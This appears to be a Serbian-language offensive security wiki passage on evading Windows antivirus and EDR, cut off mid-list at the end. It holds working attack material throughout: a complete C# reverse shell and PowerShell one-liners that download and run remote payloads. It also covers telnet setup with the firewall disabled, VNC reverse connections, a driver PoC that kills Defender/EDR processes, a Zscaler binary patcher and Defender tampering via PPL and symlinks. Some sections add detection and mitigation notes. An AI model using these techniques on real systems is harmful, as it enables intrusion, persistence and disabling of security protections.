<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na osnovu reputacije, što znači da će neobično preuzimane aplikacije pokrenuti SmartScreen, čime se krajnji korisnik upozorava i sprečava da izvrši fajl (iako se fajl i dalje može izvršiti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa nazivom Zone.Identifier koji se automatski kreira pri preuzimanju fajlova sa interneta, zajedno sa URL-om sa kog je preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da executables potpisani **trusted** signing certificate-om **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web jeste da ih spakujete unutar nekog kontejnera, kao što je ISO. To se dešava zato što se Mark-of-the-Web (MOTW) **ne može** primeniti na volumene koji nisu **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u izlazne kontejnere kako bi se zaobišao Mark-of-the-Web.

Primer upotrebe:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payloads unutar ISO fajlova koristeći [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan logging mehanizam u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **loguju evente**. Međutim, može se koristiti i od strane security proizvoda za nadzor i detekciju malicioznih aktivnosti.

Slično kao što se AMSI disable-uje (bypass-uje), moguće je i da **`EtwEventWrite`** funkcija procesa u user space-u odmah vrati rezultat bez logovanja bilo kakvih eventa. Ovo se radi patchovanjem funkcije u memoriji tako da se odmah vrati, čime se za taj proces efektivno onemogućava ETW logging.

Više informacija možete pronaći u **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Učitavanje C# binary-ja u memoriju je poznato već duže vreme i i dalje je veoma dobar način za pokretanje vaših post-exploitation alata bez hvatanja od strane AV-a.

Pošto će se payload učitati direktno u memoriju bez dodirivanja diska, moraćemo samo da brinemo o patchovanju AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već pruža mogućnost direktnog izvršavanja C# assemblies u memoriji, ali postoje različiti načini da se to uradi:

- **Fork\&Run**

Ovo podrazumeva **pokretanje novog sacrificial procesa**, injektovanje vašeg post-exploitation malicioznog koda u taj novi proces, izvršavanje malicioznog koda i, kada završi, ubijanje novog procesa. Ovo ima i svoje prednosti i svoje mane. Prednost fork and run metode je što se izvršavanje dešava **van** našeg Beacon implant procesa. To znači da, ako nešto u vašoj post-exploitation akciji pođe po zlu ili bude uhvaćeno, postoji **mnogo veća šansa** da će naš **implant preživeti.** Mana je što postoji **mnogo veća šansa** da budete uhvaćeni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju post-exploitation malicioznog koda **u njegov sopstveni proces**. Na taj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali mana je što, ako nešto pođe po zlu tokom izvršavanja vašeg payload-a, postoji **mnogo veća šansa** da ćete **izgubiti svoj beacon** jer može da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o C# Assembly loading-u, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Možete takođe učitati C# Assemblies **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršiti maliciozni code koristeći druge jezike tako što kompromitovanoj mašini date pristup **interpreter environment-u instaliranom na Attacker Controlled SMB share-u**.

Omogućavanjem pristupa Interpreter Binary-jima i environment-u na SMB share-u možete **izvršiti arbitrary code u ovim jezicima unutar memorije** kompromitovane mašine.

Repo navodi: Defender i dalje skenira scripts, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo static signatures**. Testiranje sa nasumičnim ne-obfuscated reverse shell scripts u ovim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping je tehnika koja napadaču omogućava da **manipuliše access token-om ili security prouct-om kao što je EDR ili AV**, omogućavajući mu da smanji privilegije tako da proces neće umreti, ali neće imati dozvole da proverava maliciozne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao da **spreči external processes** da dobijaju handle-ove nad tokenima security procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje trusted software

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog post-u**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je jednostavno deploy-ovati Chrome Remote Desktop na žrtvin PC i zatim ga koristiti za takeover i održavanje persistence:
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", a zatim kliknite na MSI fajl za Windows da biste preuzeli MSI fajl.
2. Pokrenite installer tiho na žrtvi (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na Chrome Remote Desktop stranicu i kliknite next. Čarobnjak će tada tražiti da autorizujete; kliknite na dugme Authorize da nastavite.
4. Izvršite dati parameter uz neka podešavanja: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Imajte u vidu pin param koji omogućava da se pin postavi bez korišćenja GUI-ja).


## Advanced Evasion

Evasion je veoma komplikovana tema, ponekad morate uzeti u obzir mnogo različitih izvora telemetry-ja u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno undetected u zrelim okruženjima.

Svako okruženje protiv kojeg nastupate imaće svoje prednosti i mane.

Toplo preporučujem da pogledate ovaj talk od [@ATTL4S](https://twitter.com/DaniLJ94), da biste stekli oslonac u naprednije Evasion tehnike.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe još jedno odlično predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **ukloniti delove binary-ja** dok **ne otkrije koji deo Defender** prepoznaje kao maliciozan i podeli vam ga.\
Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenim web ponudom servisa na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows-i su dolazili sa **Telnet server-om** koji ste mogli da instalirate (kao administrator) ovako:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka **startuje** kada se sistem pokrene i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (želite bin downloads, ne setup)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binary _**winvnc.exe**_ i **novo** kreiranu datoteku _**UltraVNC.ini**_ unutar **victim**

#### **Reverse connection**

**attacker** treba da **izvrši unutar** svog **host** binary `vncviewer.exe -listen 5900` kako bi bio **spreman** da uhvati reverse **VNC connection**. Zatim, unutar **victim**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Da biste održali stealth ne smete da uradite nekoliko stvari

- Ne pokrećite `winvnc` ako je već pokrenut ili ćete izazvati [popup](https://i.imgur.com/1SROTTl.png). proverite da li je pokrenut sa `tasklist | findstr winvnc`
- Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu jer će to izazvati otvaranje [the config window](https://i.imgur.com/rfMQWcf.png)
- Ne pokrećite `winvnc -h` za pomoć ili ćete izazvati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će vrlo brzo terminisati proces.**

### Kompajliranje našeg sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga sa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristi ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# koristeći compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Upotreba python-a za build injectors primer:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 je iskoristio mali konzolni utilitiy poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre nego što je izbacio ransomware. Alat donosi svoj **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga da izvrši privilegovane kernel operacije koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu da blokiraju.

Ključne poruke
1. **Potpisani driver**: Fajl koji se isporučuje na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs “System In-Depth Analysis Toolkit”. Pošto driver nosi važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel servis**, a druga ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz user land.
3. **IOCTLs koje driver izlaže**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto radi**:  BYOVD potpuno preskače user-mode zaštite; kod koji se izvršava u kernelu može da otvara *protected* procese, da ih terminira ili da menja kernel objekte bez obzira na PPL/PP, ELAM ili druge hardening funkcije.

Detekcija / Mitigacija
•  Omogućite Microsoftovu vulnerable-driver block list (`HVCI`, `Smart App Control`) tako da Windows odbija da učita `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i alarmirajte kada se driver učitava iz direktorijuma koji je world-writable ili nije na allow-listi.
•  Pazite na user-mode handle-ove ka custom device objektima, praćene sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler **Client Connector** lokalno primenjuje device-posture pravila i oslanja se na Windows RPC da prenese rezultate drugim komponentama. Dve slabe dizajnerske odluke omogućavaju potpuni bypass:

1. Evaluacija posture-a se obavlja **u potpunosti na klijentu** (serveru se šalje boolean).
2. Interni RPC endpointi samo proveravaju da je izvršni fajl koji se povezuje **potpisan od strane Zscaler-a** (preko `WinVerifyTrust`).

Kroz **patching četiri potpisana binarna fajla na disku** oba mehanizma mogu da se neutrališu:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` tako da je svaka provera compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ bilo koji (čak i unsigned) process može da se binduje na RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimalni patcher izvod:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i restartovanja service stack-a:

* **Sve** posture provere prikazuju **zeleno/compliant**.
* Nepisani ili izmenjeni binarni fajlovi mogu da otvore named-pipe RPC endpoint-e (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler politikama.

Ova studija slučaja pokazuje kako se čisto client-side trust odluke i jednostavne provere potpisa mogu zaobići uz nekoliko byte patch-eva.

## Abuse Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) nameće hijerarhiju signer/level tako da samo jednako ili više zaštićeni procesi mogu da međusobno tamper-uju. Ofanzivno, ako možeš legitimno da pokreneš PPL-enabled binary i kontrolišeš njegove argumente, možeš pretvoriti benignu funkcionalnost (npr. logging) u ograničen, PPL-backed write primitive protiv protected direktorijuma koje koriste AV/EDR.

Šta čini da proces radi kao PPL
- Target EXE (i svi učitani DLL-ovi) moraju biti potpisani PPL-capable EKU.
- Proces mora biti kreiran sa CreateProcess pomoću flag-ova: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora biti zatražen kompatibilan protection level koji odgovara signer-u binarnog fajla (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware signer-e, `PROTECTION_LEVEL_WINDOWS` za Windows signer-e). Pogrešni nivoi će fail-ovati pri kreiranju.

Pogledaj i širi uvod u PP/PPL i LSASS zaštitu ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (bira protection level i prosleđuje argumente target EXE-u):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitiv: ClipUp.exe
- Potpisani sistemski binar `C:\Windows\System32\ClipUp.exe` self-spawn-uje i prihvata parametar za upis log fajla na putanju koju zada caller.
- Kada se pokrene kao PPL proces, upis fajla se izvršava uz PPL backing.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite 8.3 short paths da biste pokazali na normalno zaštićene lokacije.

8.3 short path helpers
- Prikaži short names: `dir /x` u svakom parent direktorijumu.
- Izvedi short path u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokreni PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledi ClipUp log-path argument da nateraš kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristi 8.3 short names.
3) Ako je ciljni binar normalno otvoren/zaključan od strane AV-a dok radi (npr. MsMpEng.exe), zakaži upis pri boot-u pre nego što se AV pokrene tako što ćeš instalirati auto-start servis koji pouzdano radi ranije. Validiraj boot ordering sa Process Monitor (boot logging).
4) Pri reboot-u PPL-backed upis se desi pre nego što AV zaključa svoje binare, korumpira ciljnu datoteku i sprečava startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim pozicioniranja; ova primitiva je pogodna za korupciju, a ne za preciznu injekciju sadržaja.
- Zahteva lokalni admin/SYSTEM za instalaciju/pokretanje servisa i reboot prozor.
- Tajming je kritičan: cilj ne sme biti otvoren; izvršavanje pri boot-u izbegava file lockove.

Detections
- Process creation od `ClipUp.exe` sa neuobičajenim argumentima, posebno kada je pokrenut od strane nestandardnih launcher-a, oko boot-a.
- Novi servisi podešeni da auto-startuju sumnjive binarije i dosledno se pokreću pre Defender/AV. Istražite kreiranje/modifikaciju servisa pre neuspeha pri pokretanju Defender-a.
- File integrity monitoring nad Defender binarijama/Platform direktorijumima; neočekivano kreiranje/modifikacije fajlova od strane procesa sa protected-process flagovima.
- ETW/EDR telemetry: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu PPL upotrebu od strane binarija koje nisu AV.

Mitigations
- WDAC/Code Integrity: ograničite koje potpisane binarije smeju da se izvršavaju kao PPL i pod kojim parent-ovima; blokirajte ClipUp pozive van legitimnih konteksta.
- Service hygiene: ograničite kreiranje/modifikaciju auto-start servisa i pratite manipulaciju redosledom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch protections omogućeni; istražite startup greške koje ukazuju na korupciju binarija.
- Razmotrite onemogućavanje generisanja 8.3 short-name na volume-ima koji hostuju security tooling ako je kompatibilno sa vašim okruženjem (temeljno testirajte).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender bira platformu iz koje radi tako što enumeriše podfoldere pod:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfolder sa najvišim lexicographic version string-om (npr. `4.18.25070.5-0`), a zatim pokreće procese Defender servisa odatle (ažurirajući service/registry paths u skladu s tim). Ovaj izbor veruje directory entries uključujući directory reparse points (symlinks). Administrator to može iskoristiti da preusmeri Defender na putanju upisivu od strane napadača i postigne DLL sideloading ili prekid rada servisa.

Preconditions
- Local Administrator (potrebno za kreiranje direktorijuma/symlinks pod Platform folderom)
- Mogućnost reboot-a ili pokretanja Defender re-selekcije platforme (restart servisa pri boot-u)
- Potrebni su samo built-in alati (mklink)

Why it works
- Defender blokira upis u sopstvene foldere, ali izbor platforme veruje directory entries i bira lexicographic najvišu verziju bez validacije da li se target razrešava na zaštićenu/trusted putanju.

Step-by-step (example)
1) Pripremite writable klon trenutnog platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Napravite symlink direktorijuma više verzije unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Okidanje selekcije (preporučen restart):
```cmd
shutdown /r /t 0
```
4) Proverite da li MsMpEng.exe (WinDefend) radi iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Treba da posmatrate novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registry koja odražava tu lokaciju.

Post-exploitation opcije
- DLL sideloading/code execution: Ubacite/zamenite DLL-ove koje Defender učitava iz svog direktorijuma aplikacije da biste izvršili code u Defender-ovim procesima. Pogledajte deo iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da pri sledećem startu konfigurisana putanja ne može da se resolve-uje i Defender ne uspe da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne obezbeđuje privilege escalation; zahteva admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogu da premeste runtime evasion iz C2 implant-a u sam target modul tako što hook-uju njegov Import Address Table (IAT) i usmeravaju odabrane API-je kroz attacker-controlled, position‑independent code (PIC). Ovo generalizuje evasion izvan male API površine koju mnogi kit-ovi izlažu (npr. CreateProcessA), i proširuje iste zaštite na BOFs i post-exploitation DLL-ove.

High-level approach
- Postavite PIC blob uz target modul pomoću reflective loader-a (prepended ili companion). PIC mora biti self-contained i position-independent.
- Kako se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i patchujte IAT unose za ciljane import-e (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava evasion pre nego što tail-call-uje stvarnu adresu API-ja. Tipični evasion-i uključuju:
